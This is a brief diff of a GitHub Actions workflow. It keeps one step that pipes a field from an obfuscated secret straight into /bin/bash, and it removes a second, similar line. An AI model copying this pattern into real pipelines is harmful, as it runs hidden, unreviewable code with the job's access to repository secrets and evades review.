@@ -22,7 +22,6 @@ jobs:
           xjttd6889: ${{ secrets.xjttd6889 }}
         run: |
           printf '%s' "$xjttd6889" | jq -r .vl9501 | /bin/bash
-          printf '%s' "$d672" | jq -r .z949 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
